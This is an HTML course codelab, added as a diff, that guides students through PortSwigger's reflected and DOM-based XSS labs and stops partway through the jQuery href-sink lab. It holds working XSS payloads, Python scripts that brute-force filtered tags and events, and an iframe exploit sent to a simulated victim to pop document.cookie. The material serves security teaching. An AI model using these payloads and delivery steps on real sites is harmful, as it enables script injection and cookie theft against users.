@@ -1,0 +1,635 @@
+
+<!doctype html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
+<meta name="theme-color" content="#4F7DC9">
+<meta charset="UTF-8">
+<title>4.1: XSS</title>
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+<link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+<link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
+<style>
+.success{color:#1e8e3e}.error{color:red} </style>
+</head>
+<body>
+<google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+<google-codelab codelab-gaid="" id="W4.1_xss" title="4.1: XSS" environment="web" feedback-link="https://docs.google.com/document/d/1AlqyaRjGCdmczJvJe1zgYdwlV7DhupDndUz4Y_P5yIE">
+<google-codelab-step label="cross-site-scripting/reflected (1)" duration="3">
+<p>Cross-site scripting or XSS is a web security vulnerability that allows an attacker to inject Javascript in content that is then executed by the client browser. These labs demonstrate a variety of ways for performing the attack as well as ways for exploiting the vulnerability to obtain unauthorized access. </p>
+<h2 is-upgraded><a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded" target="_blank">html-context-nothing-encoded</a></h2>
+<p>This lab contains the canonical reflected XSS attack. Within the search function of the website, the search term provided by the client is reflected back directly into the HTML context of the results page. The goal of the lab is to bounce an <code>alert()</code> call off of the vulnerable website to trick a client into running the <code>alert()</code> function. One can solve this level by bouncing an arbitrary script off of the site by searching for it. When the search term is returned in the results, the script is executed directly. A Python snippet for doing so is shown below.</p>
+<pre><code>s = requests.Session()
+search_url = f&#39;https://{site}/?search=&lt;script&gt;alert(1)&lt;/script&gt;&#39;
+resp = s.get(search_url)</code></pre>
+<p>As we will see in subsequent levels, in order to weaponize the vulnerability, the adversary would send the link to a victim for the victim to click on.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="cross-site-scripting/reflected (2)" duration="10">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked" target="_blank">html-context-with-most-tags-and-attributes-blocked</a></h2>
+<p>Performing input validation on the search terms being processed can be one step for preventing this attack. Many web-application firewalls (WAFs) will, in fact, filter out common XSS payloads, ensuring they never reach the backend server that might have this vulnerability. In this level, the &lt;<code>script</code>&gt; tag is disallowed along with other attributes that are often included in XSS payloads. To begin with, attempt the previous level&#39;s solution and examine the response code and the result. If the response code is not 200 (e.g. OK), the script prints out the error message returned.</p>
+<pre><code>search_term = &#39;&#39;&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&#39;&#39;
+search_url = f&#39;https://{site}/?search={search_term}&#39;
+resp = s.get(search_url)
+if resp.status_code == 200:
+    print(f&#39;Success: {search_url} gives {resp.status_code}&#39;)
+else:
+    print(f&#39;Error: {search_url} gives {resp.status_code}: {resp.text}&#39;)</code></pre>
+<p>While it appears that we can not inject the &lt;<code>script</code>&gt; tag, Javascript code can be invoked as event attributes in other tags. For this particular level, the &lt;<code>body</code>&gt; tag is allowed. Test that this is the case by filling out your Odin ID for &lt;<code>FMI</code>&gt; in the search term of the snippet below and re-running the script with the new search:</p>
+<pre><code>odin_id = &#39;&lt;FMI&gt;&#39;
+search_term = f&#39;&#39;&#39;&lt;body&gt;{odin_id}&lt;/body&gt;&#39;&#39;&#39;
+search_url = f&#39;https://{site}/?search={search_term}&#39;</code></pre>
+<p>We&#39;ll now test which &lt;<code>body</code>&gt; attributes might be allowed through the filter via brute-force. Within HTML, there are dozens of them (window, keyboard, mouse, drag, clipboard, media). For this level, a <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank">window event</a> is allowed through. The Python snippet below contains a subset of the window events that can be specified. The script will attempt to use each attribute to cause the victim to execute <code>alert(document.cookie</code>) when the window event occurs. Run the snippet to determine all of the attributes that are allowed through.</p>
+<pre><code>attributes = [&#39;onload&#39;,&#39;onunload&#39;,&#39;onerror&#39;,&#39;onmessage&#39;,&#39;onpagehide&#39;,&#39;onpageshow&#39;,&#39;onresize&#39;,&#39;onstorage&#39;]
+for attribute in attributes:
+    search_term = f&#39;&#39;&#39;&lt;body {attribute}=alert(document.cookie)&gt;&lt;/body&gt;&#39;&#39;&#39;
+    search_url = f&#39;https://{site}/?search={search_term}&#39;
+    resp = s.get(search_url)
+    if resp.status_code == 200:
+        print(f&#39;Success: {search_term} gives code {resp.status_code}&#39;)
+    else:
+        print(f&#39;Error: {search_term} gives response: {resp.text}&#39;)</code></pre>
+<ul>
+<li><strong>List which window event attributes are allowed for your lab notebook</strong></li>
+</ul>
+<p>Running the snippet shows that the resizing window event attribute is allowed. Visit the web site and run a search that reflects the &lt;<code>body</code>&gt; tag containing the resizing attribute. When the result page is returned, resize the browser window to generate the pop-up as shown below.</p>
+<p class="image-container"><img style="width:624px" src="img/92b37d9c8963caac.png"></p>
+<ul>
+<li><strong>Include a screenshot of the pop-up</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="-" duration="3">
+<h3 is-upgraded>Exploit server</h3>
+<p>For this level, an exploit server is given to us at the top of the web site that we can use to compromise the victim. The server allows us to place arbitrary HTML content at <code>https://{exploit_site}/exploit</code> that the simulated victim will blindly access when we deliver it to them. From the top of the page on the level site, click on &#34;Go to exploit server&#34; to access the server. On the exploit server, we have the ability to store the body of an HTML file to whatever path we choose on it (defaulted to <code>/exploit</code>), to preview what it looks like, to deliver the exploit to the victim, and to view the exploit server&#39;s log file.</p>
+<p class="image-container"><img style="width:604px" src="img/d2e84613a5c9b5a3.png"></p>
+<p>Inspect page to see that the interactions with the exploit server are implemented via a single HTML form. A snippet of the form is shown below that enumerates the actions that can be performed with it</p>
+<pre><code>&lt;form id=feedbackForm action=&#34;/&#34; method=&#34;POST&#34;&gt;
+  ...
+  &lt;label&gt;HTTPS&lt;/label&gt;
+  &lt;input type=&#34;checkbox&#34; name=&#34;urlIsHttps&#34; checked /&gt;
+  &lt;label&gt;File:&lt;/label&gt;
+  &lt;input type=&#34;text&#34; name=&#34;responseFile&#34; value=&#34;/exploit&#34; /&gt;
+  &lt;label&gt;Head:&lt;/label&gt;
+  &lt;textarea name=&#34;responseHead&#34;&gt;&lt;/textarea&gt;
+  &lt;label&gt;Body:&lt;/label&gt;
+  &lt;textarea name=&#34;responseBody&#34;&gt;&lt;/textarea&gt;
+
+  &lt;button name=&#34;formAction&#34; value=&#34;STORE&#34; type=&#34;submit&#34;&gt;Store&lt;/button&gt;
+  &lt;button name=&#34;formAction&#34; value=&#34;VIEW_EXPLOIT&#34; type=&#34;submit&#34;&gt;View exploit&lt;/button&gt;
+  &lt;button name=&#34;formAction&#34; value=&#34;DELIVER_TO_VICTIM&#34; type=&#34;submit&#34;&gt;Deliver exploit to victim&lt;/button&gt;
+  &lt;button name=&#34;formAction&#34; value=&#34;ACCESS_LOG&#34; type=&#34;submit&#34;&gt;Access log&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+<p>As the form shows, for this level, one can store an exploit shown specified in the <code>responseBody textarea</code>, view the exploit as the victim would, deliver the exploit to the victim to click on, and view the access logs for the exploit server. The actions are specified by the associated <code>formAction</code> values <code>STORE</code>, <code>VIEW_EXPLIOT</code>, <code>DELIVER_TO_VICTIM</code>, and <code>ACCESS_LOG</code>.</p>
+</google-codelab-step>
+<google-codelab-step label="-" duration="3">
+<h3 is-upgraded>Programmatic interaction with exploit server</h3>
+<p>The script below programmatically retrieves the exploit server&#39;s URL and creates a POST request to it that uses the <code>formAction</code> of <code>STORE</code> to store some innocuous HTML into the <code>/exploit</code> route. Run the script to store the exploit on the exploit server. </p>
+<pre><code>site_url = f&#39;https://{site}/&#39;
+resp = s.get(site_url)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+exploit_url = soup.find(&#39;a&#39;, {&#39;id&#39;:&#39;exploit-link&#39;}).get(&#39;href&#39;)
+exploit_html = f&#39;&#39;&#39;&lt;h1&gt;Hello {odin_id}&lt;/h1&gt;&#39;&#39;&#39;
+formData = {
+    &#39;urlIsHttps&#39;: &#39;on&#39;,
+    &#39;responseFile&#39;: &#39;/exploit&#39;,
+    &#39;responseHead&#39;: &#39;HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8&#39;,
+    &#39;responseBody&#39;: exploit_html,
+    &#39;formAction&#39;: &#39;STORE&#39;
+}
+resp = s.post(exploit_url, data=formData)</code></pre>
+<p>Visit the exploit server and click on &#34;View exploit&#34; to show that it has been stored properly as shown below:</p>
+<p class="image-container"><img style="width:611px" src="img/b54548b65b05bae2.png"></p>
+<p>Then, click on &#34;Access log&#34; to show that the POST from your Python program has been recorded, along with the IP address of the machine you&#39;re using. This IP address will help you differentiate between accesses from the victim and your own.</p>
+<p class="image-container"><img style="width:624px" src="img/a8881c53a9105fb5.png"></p>
+<ul>
+<li><strong>Take a screenshot of the above log entry and include it in your lab notebook.</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="-" duration="5">
+<h3 is-upgraded>Develop and deliver exploit</h3>
+<p>We will now use this vulnerability and the victim&#39;s request to the exploit server to complete the level. The strategy for the exploit is to upload content to <code>/exploit</code> that implements an <code>iframe</code> whose source is the URL for the reflected search term that pops up the <code>document.cookie</code> in an alert box. Doing so, solves the level. Begin by changing the script for uploading the exploit payload to the code below. </p>
+<pre><code>search_term = &#39;&#39;&#39;&lt;body onresize=alert(document.cookie)&gt;&lt;/body&gt;&#39;&#39;&#39;
+exploit_html = f&#39;&#39;&#39;&lt;iframe src=&#34;https://{site}/?search={search_term}&#34; onload=this.style.width=&#39;100px&#39;&gt;&lt;/iframe&gt;&#39;&#39;&#39;</code></pre>
+<p>As the code shows, we deliver an <code>iframe</code> whose <code>src</code> points to the reflected search term which performs the <code>alert(document.cookie)</code>. We then trick the victim&#39;s browser into automatically triggering a window resizing event by setting the window&#39;s width to 100 pixels. Store the exploit and then go back to the exploit server and &#34;View exploit&#34; to show that it has been stored properly and generates the pop-up.</p>
+<p class="image-container"><img style="width:624px" src="img/47de842b6050e050.png"></p>
+<p>After clearing the pop-up, you can view the page source of the <code>/exploit</code> page to see its content.</p>
+<p class="image-container"><img style="width:596px" src="img/7d3c9214c2bd2a54.png"></p>
+<p>You can also view the frame source of the <code>iframe</code> itself to see that it contains the results of the search that contains the reflected content.</p>
+<p class="image-container"><img style="width:592px" src="img/37f4be531497c4b7.png"></p>
+<p>We can now complete the level by delivering it to the victim. The prior form submissions only <code>STORE</code> the exploit. We can simply change the <code>formAction</code> to <code>DELIVER_TO_VICTIM</code> and the victim will then automatically access the exploit to test for a successful exploit.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="cross-site-scripting/reflected (3)" duration="7">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed" target="_blank">some-svg-markup-allowed</a></h2>
+<p>This level contains the same vulnerability in that the search term is reflected back into the HTML context of the results page. However, unlike before, the &lt;<code>script</code>&gt; tag is filtered out. Begin by attempting a search using the &lt;<code>script</code>&gt; tag as a search term.</p>
+<pre><code>tag = &#39;script&#39;
+search_url = f&#39;https://{site}/?search=&lt;{tag}&gt;&#39;
+resp = s.get(search_url)
+print(f&#39;Status code is {resp.status_code} with response text {resp.text}&#39;)</code></pre>
+<ul>
+<li><strong>Show the HTTP status code and response text obtained</strong></li>
+</ul>
+<p>As shown before, XSS can be triggered via event attributes to HTML tags that include Javascript code. While the site filters out &lt;<code>script</code>&gt;, there are a lot of other HTML tags one could use. We can perform a brute-force attack across all of the valid HTML tags in order to see what the site does not filter. Visit Portswigger&#39;s <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank">XSS cheat sheet</a> to copy the set of HTML tags. Then, create a list in Python called <code>tags</code> that includes them and adapt the Python script below to list which <code>tags</code> are not being filtered.</p>
+<pre><code>tags = [&#39;a2&#39;, &#39;abbr&#39;, &#39;acronym&#39;, &lt;FMI&gt;]
+for tag in tags:
+    search_url = f&#39;https://{site}/?search=&lt;{tag}&gt;&#39;
+    resp = s.get(search_url)
+    # Your code to check response</code></pre>
+<ul>
+<li><strong>Show the list of tags that are not filtered</strong></li>
+</ul>
+<p>Two of the tags that have not been filtered are the &lt;<code>svg</code>&gt; and &lt;<code>animatetransform</code>&gt;tags. Unfortunately, these tags can specify Javascript in event handlers that can allow arbitrary code to be executed. The site filters event attributes as well. Using the &lt;<code>animatetransform</code>&gt; tag, run another script to determine which event handlers in the <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank">XSS cheat sheet</a> are allowed.</p>
+<pre><code>events = [&#39;onactivate&#39;, &#39;onafterprint&#39;, &#39;onafterscriptexecute&#39;, &lt;FMI&gt;]
+for event in events:
+    search_url = f&#39;https://{site}/?search=&lt;animatetransform {event}&gt;&#39;
+    resp = s.get(search_url)
+    # Your code to check response</code></pre>
+<ul>
+<li><strong>Show the list of events that are not filtered</strong></li>
+</ul>
+<p>Then, use the following search to solve the level:</p>
+<pre><code>search_term = &#39;&#39;&#39;&lt;svg&gt;&lt;animatetransform onbegin=alert(1)&gt;&#39;&#39;&#39;</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId </strong></li>
+</ul>
+<p>Note that if the level does not solve after you trigger the alert, you may need to wait until it resets and send the payload to a fresh level.</p>
+</google-codelab-step>
+<google-codelab-step label="cross-site-scripting/reflected (4)" duration="8">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded" target="_blank">attribute-angle-brackets-html-encoded</a></h2>
+<p>Prior levels have had the search term containing the cross-site scripting attack reflected back into the HTML context of the returning page. Vulnerable applications can reflect the search term in other contexts on the returning page, however. In this level, the search term is reflected back in two places. To prevent the reflected content from running in the HTML context, HTML-encoding has been applied to the tag characters (e.g. &lt; and &gt;) in order to keep them from being interpreted as HTML when reflected. Encoding must be done in every context the term is reflected back into, however.</p>
+<p>Begin by visiting the page and entering a tag consisting of your OdinId as the search term (e.g. &lt;wuchang&gt;). </p>
+<p class="image-container"><img style="width:624px" src="img/75630de6502e74cb.png"></p>
+<p>View the source of the result page to see the search term appear into two contexts.</p>
+<ul>
+<li><strong>Show the part of the source demonstrating that the content has been HTML-encoded in the HTML context</strong></li>
+<li><strong>Show the part of the source demonstrating that the reflected content also appears within an HTML tag&#39;s context</strong></li>
+</ul>
+<p>The page implements a pre-filled form. Within the search&#39;s &lt;<code>input</code>&gt; tag context, the original search term has been pre-filled using the tag&#39;s <code>value</code> attribute. The Python snippet below performs the same request and prints out the &lt;<code>input</code>&gt; tag. Fill it in with your Odin ID and run the script to regenerate the result.</p>
+<pre><code>odin_id = &#39;&lt;FMI&gt;&#39;
+search_term = odin_id
+search_url = f&#39;https://{site}/?search={search_term}&#39;
+resp = s.get(search_url)
+for line in resp.text.split(&#39;\n&#39;):
+    if &#39;input&#39; in line:
+        print(line)</code></pre>
+<p>While we have protected against injection in the HTML context with HTML-encoding, we must also protect against the reflection attacks within the &lt;<code>input</code>&gt; tag&#39;s context. Much like SQL-injection attacks that break strings with quotes, the <code>value</code> attribute that the search term is reflected into may also be vulnerable to injection. The field is delineated with double-quotes. By injecting a pair of double quotes, we may be able to inject rogue attributes into the tag. Using the script above, perform the search below:</p>
+<pre><code>search_term = f&#39;&#39;&#39;{odin_id}&#34; foo=&#34;bar&#39;&#39;&#39;</code></pre>
+<ul>
+<li><strong>Take a screenshot of the output for your lab notebook</strong></li>
+</ul>
+<p>The first double-quote terminates the <code>value</code> field, making the pre-filled field show just your <code>odin_id</code>. Doing so also places the rest of the <code>search_term</code> within the &lt;<code>input</code>&gt; tag&#39;s context, causing <code>foo="bar"</code> to be treated as another attribute within the &lt;<code>input</code>&gt; tag. Finish the level by running a search in which <code>foo</code> is replaced with <code>onmouseover</code> and <code>bar</code> is replaced with <code>alert(1)</code>.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="cross-site-scripting/reflected (5)" duration="10">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped" target="_blank">javascript-string-single-quote-backslash-escaped</a></h2>
+<p>There are several different contexts on the search results page that the reflected content can appear in. A typical strategy is to probe a site with a unique string and examine where the string appears. Begin this level by repeating the search consisting of a tag containing your OdinId (e.g. &lt;<code>wuchang</code>&gt;). View the source of the resulting page.</p>
+<ul>
+<li><strong>Within the source, show the two contexts that the search term appears in.</strong></li>
+</ul>
+<p>The search term is properly HTML-encoded in the HTML context, preventing the injection of the tag. However, the tag appears unencoded within the Javascript code that implements a tracker image on the page. Inspect the page and locate the tracker image.</p>
+<ul>
+<li><strong>Open the tracker image in a new tab and show its URL that contains the search term</strong></li>
+</ul>
+<p>When parsed by the browser, the lack of encoding within the Javascript code is problematic. What might happen if one injected a &lt;<code>/script</code>&gt; instead? Would this terminate the script&#39;s execution?</p>
+<ul>
+<li><strong>Perform the search for &lt;</strong><strong><code>/script</code></strong><strong>&gt; and explain why the string below the search form appears and where it came from</strong></li>
+</ul>
+<p>Then, inspect the page in Developer Tools and find the tracking image. Open it in a new tab.</p>
+<ul>
+<li><strong>Show its URL and explain why it no longer contains the search term</strong></li>
+</ul>
+<p>Solve the level by terminating the Javascript that implements the tracker image and then injecting another &lt;<code>script</code>&gt; tag that performs an <code>alert</code>.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="cross-site-scripting/reflected (6)" duration="10">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded" target="_blank">javascript-string-angle-brackets-html-encoded</a></h2>
+<p>Begin by searching the site using the solution to the prior level. View the source of the resulting page.</p>
+<ul>
+<li><strong>Take a screenshot of the search term as it is reflected back in the Javascript code. What has been done to the search term as it appears in the Javascript code?</strong></li>
+</ul>
+<p>While the page may be preventing the insertion of HTML tag characters, the page may still be vulnerable to other injection attacks. In the Javascript code, examine the string variable that holds the reflected search term. Much like SQL injection attacks attempt to escape out of the query string via the injection of the single-quote or double-quote, we can attempt to escape out of the Javascript string by injecting its delimiter (in this case, <code>'</code>)</p>
+<p>Bring up Developer Tools and click on the Javascript console. Then, perform a search using the string delimiter character.</p>
+<ul>
+<li><strong>Show the error that is returned and the line number it occurs on.</strong></li>
+</ul>
+<p>Click on the line number to view the error. The broken assignment has three quotes followed by a semi-colon, indicating that the delimiter used as a search string has broken the syntax of the Javascript statement. To be included safely in Javascript, the application must backslash escape the delimiter if used in the search term (e.g. <code>\'</code> ).</p>
+<p>Because the web application does not perform the escape, we can inject arbitrary Javascript into the tracking script on the results page. Consider the Javascript code that is returned on the results page when the search term is <code>foo</code>, as highlighted in red below.</p>
+<p class="image-container"><img style="width:556px" src="img/69695490a6d63837.png"></p>
+<p>Repeat the search above with Developer Tools running and use the string <code>'; // hello</code>. View the source line above as well as the &lt;<code>img</code>&gt; tag that the script writes to the page. Answer the following questions for your lab notebook:</p>
+<ul>
+<li><strong>Why does the search term not appear in the &lt;</strong><strong><code>img</code></strong><strong>&gt; tag?</strong></li>
+<li><strong>What does // do in the Javascript code?</strong></li>
+</ul>
+<p>If we search for <code>foo'; searchTerms = 'bar</code>, the Javascript code then becomes:</p>
+<p class="image-container"><img style="width:551px" src="img/de08f4e86d8f2f52.png"></p>
+<p>As the code shows, the search term terminates the string and statement with <code>foo';</code> , then performs a reassignment of the <code>searchTerms</code> variable to &#39;<code>bar</code>&#39;, employing the original statement&#39;s <code>';</code> to end the second assignment. This will result in the tracker image using &#39;<code>bar</code>&#39;. Perform the above search, then inspect the results page in Developer Tools to find the tracker image.</p>
+<p class="image-container"><img style="width:261px" src="img/7dde96e6c99ba12b.png"></p>
+<ul>
+<li><strong>Take a screenshot of its URL demonstrating successful injection of the second Javascript assignment.</strong></li>
+</ul>
+<p>With the injection happening directly into Javascript, add an <code>alert(1)</code> to your injection to trigger a pop-up on the client when reflected back and solve the level.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="cross-site-scripting/reflected (7)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped" target="_blank">javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped</a></h2>
+<p>In this level, the single-quote is properly escaped when included into the Javascript code for the tracker image. Bring up Developer Tools and perform the search using a single-quote again. Unlike the prior level, the single-quote does not break syntax as a result of the character being escaped with a backslash as shown below.</p>
+<p class="image-container"><img style="width:304px" src="img/131b579049086380.png"></p>
+<p>The &lt;<code>img</code>&gt; tag then appropriately includes the single-quote as the search term.</p>
+<p class="image-container"><img style="width:374px" src="img/d6828d53226157cf.png"></p>
+<p>Repeat the search using the backslash character followed by the single-quote. Go to the console of Developer Tools and find the error.</p>
+<ul>
+<li><strong>Explain why this error has happened and what needs to be done to fix it</strong></li>
+</ul>
+<p>Solve the level using the injection from the previous level.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="cross-site-scripting/reflected (8)" duration="8">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped" target="_blank">javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped</a> </h2>
+<p>Template literals or template strings in Javascript are similar to f-strings in Python in that they allow one to create strings with language expressions included in-line via the syntax <code>${expression}</code>. Consider the following code in which the <code>email</code> template literal includes a placeholder expression consisting of the variable <code>name.</code></p>
+<pre><code>var name = &#34;wuchang&#34;;
+var email = `${name}@pdx.edu`</code></pre>
+<p>After assignment, <code>email</code> evaluates to <code>wuchang@pdx.edu</code>. </p>
+<p>Begin by visiting the site and searching for your OdinId in the blog. Inspect the blog-header section of the results page and view the HTML element containing your OdinId. Then, find the Javascript code that the client executes to generate the text for this element.</p>
+<ul>
+<li><strong>Show this line of Javascript</strong></li>
+</ul>
+<p>The Javascript code references a string that is produced using a template literal.</p>
+<ul>
+<li><strong>Show the line that defines the template literal.</strong></li>
+</ul>
+<p>The use of a template literal in this case is unnecessary and unfortunate. Since the adversary controls the search term that is used in this template literal, unless properly filtered, there is an opportunity for them to inject an arbitrary expression into this literal via insertion of a placeholder that is then evaluated as Javascript code. Repeat the search using the string <code>cs${490+5}</code>. View the HTML element and template literal in Developer Tools</p>
+<ul>
+<li><strong>Explain the results</strong></li>
+</ul>
+<p>By not sanitizing the input used for the template literal, the adversary is able to execute Javascript code. Solve the level using the template literal to execute an <code>alert()</code>.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="cross-site-scripting/dom-based (1)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink" target="_blank">document-write-sink</a> </h2>
+<p>When client-side Javascript is used to generate DOM elements, it must be careful not to use any untrusted input without proper sanitization. Begin by visiting the site and searching for your OdinId. View the raw page source to examine the Javascript code that, when executed, writes a tracker <code>img</code> into the page that includes the search term. The code does so by parsing the URL to find the value of the <code>search</code> parameter. We can see the &lt;<code>img</code>&gt; tag that is written to the page after the page is rendered by the browser. To see it, go back to the search results page and bring up the DOM inspector in Developer Tools to view its elements. Expand out the sections to find Javascript code that writes the tag and the &lt;<code>img</code>&gt; tag it has written into the DOM. </p>
+<p>Within the &lt;<code>img</code>&gt; tag, examine the delimiter used to denote the URI. As in prior injection levels, we must ensure that a search term that includes this delimiter doesn&#39;t break syntax. Prepend this string delimiter to your OdinId and repeat the search.</p>
+<ul>
+<li><strong>Take a screenshot of the &lt;</strong><strong><code>img</code></strong><strong>&gt; tag in Developer Tools and show that its syntax has been broken.</strong></li>
+</ul>
+<p>Since we can now break into the &lt;<code>img</code>&gt; tag, solve the level by breaking its syntax and using an <a href="https://www.w3schools.com/tags/ref_eventattributes.asp" target="_blank">event attribute</a> to trigger an <code>alert()</code>.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="cross-site-scripting/dom-based (2)" duration="10">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element" target="_blank">document-write-sink-inside-select-element</a> </h2>
+<p>Begin by visiting the site and viewing the product with <code>productId=1</code>. </p>
+<pre><code>https://{site}/product?productId=1</code></pre>
+<p>At the bottom of the page, a stock check form is implemented allowing one to select a store from a dropdown menu to query the product&#39;s availability at that store. </p>
+<p class="image-container"><img style="width:464px" src="img/6f4d6c07b97d69a5.png"></p>
+<p class="image-container"><img style="width:237px" src="img/813e04324e65f21a.png"></p>
+<p>View the source of the page and examine the Javascript code used to implement the form. To populate its DOM, the client executes the code to generate the <code>select</code> element with the various <code>option</code> elements to choose from. Examine the script and answer the following questions for your lab notebook:</p>
+<ul>
+<li><strong>How does the </strong><strong><code>store</code></strong><strong> variable get set? Can one always assume that it is one of the values in the </strong><strong><code>stores</code></strong><strong> list?</strong></li>
+<li><strong>What is the purpose of the first </strong><strong><code>if</code></strong><strong> statement? What is the purpose of the second </strong><strong><code>if</code></strong><strong> statement?</strong></li>
+</ul>
+<p>View the page in Developer Tools, expand out the form, and see the dropdown menu that the execution of the script generates.</p>
+<p>The site does not properly protect against adversarial input when implementing the store selection functionality. Use your OdinId as the store identifier in the URL below and access the product page again.</p>
+<pre><code>https://{site}/product?productId=1&amp;storeId=&lt;FMI&gt;</code></pre>
+<p>Examine the dropdown menu.</p>
+<ul>
+<li><strong>Take a screenshot showing that you have successfully injected a bogus store that is not one of the initial ones in the </strong><strong><code>stores</code></strong><strong> list.</strong></li>
+</ul>
+<p>Go back to the Javascript code and examine the <code>document.write()</code> that produces the &lt;<code>option</code>&gt; tags. Because we control the value of the variable being used in producing this string, we may be able to break its syntax or inject our own HTML tags into the page. Leverage this to invoke an <code>alert()</code> as in prior levels.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="cross-site-scripting/dom-based (3)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink" target="_blank">innerhtml-sink</a> </h2>
+<p>This level is similar to the prior ones. Javascript code is used to change the content of HTML elements (<code>innerHTML</code>) of the <code>searchMessage</code> <code>span</code> after the DOM has been created. </p>
+<p class="image-container"><img style="width:624px" src="img/30f371951bb25895.png"></p>
+<p>As before, the content is obtained via the <code>search</code> parameter in the URL. Because the adversary controls this, malicious content can be injected. Because the HTML is changed via <code>innerHTML</code> assignment, <code>script</code> elements within are not executed. Thus, a search for &#34;&lt;script&gt;alert(1)&lt;/script&gt;&#34; will not execute an <code>alert()</code>. The browser must still perform a rendering operation for embedded HTML tags, though. As a result, we can instead use event attributes in other HTML elements to perform the <code>alert()</code>.</p>
+<p>The payload &#34;&lt;<code>img src=1 onerror=alert(1)</code>&gt;&#34; is an example of such a payload. The <code>src</code> attribute points to a bogus URI. When the browser attempts to access it, an error is thrown. By specifying the <code>onerror</code> handler to be <code>alert(1)</code>, we can immediately pop-up an alert when searching for the payload. Use this to solve the level.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="cross-site-scripting/dom-based (4)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink" target="_blank">jquery-href-attribute-sink</a> </h2>
+<p>Anytime that Javascript running on a page takes in untrusted input and places it in the DOM, a cross-site scripting vulnerability can occur. In this case, the untrusted input is directly included into an &lt;<code>a</code>&gt; tag, allowing the adversary to invoke arbitrary Javascript when a link on the page is clicked.</p>
+<p>Begin by visiting the page and finding the link to &#34;Submit feedback&#34;. Copy the URL and paste it to view the URL parameter it includes. Click on the link to visit the page to submit feedback. View the original page source before it has been rendered. A &lt;<code>script</code>&gt; tag is used to include jQuery, a commonly used Javascript library. It also includes a blank link with an <code>id</code> of &#34;<code>backLink</code>&#34;.</p>
+<p class="image-container"><img style="width:392px" src="img/a8e9dfb14facc54c.png"></p>
+<p>It then includes the following jQuery expression that takes the value specified in the <code>returnPath</code> URL parameter and updates the <code>a</code> tag&#39;s <code>href</code> attribute to create a link for it.</p>
+<pre><code>&lt;script&gt;
+  $(function() {
+      $(&#39;#backLink&#39;).attr(&#34;href&#34;,
+            (new URLSearchParams(window.location.search)).get(&#39;returnPath&#39;));
+  });
+&lt;/script&gt;</code></pre>
+<p>Edit the URL in the browser and enter in your OdinId for <code>returnPath</code>. Reload the page and click on the generated backLink.</p>
+<p class="image-container"><img style="width:573px" src="img/972314d6b4cbae08.png"></p>
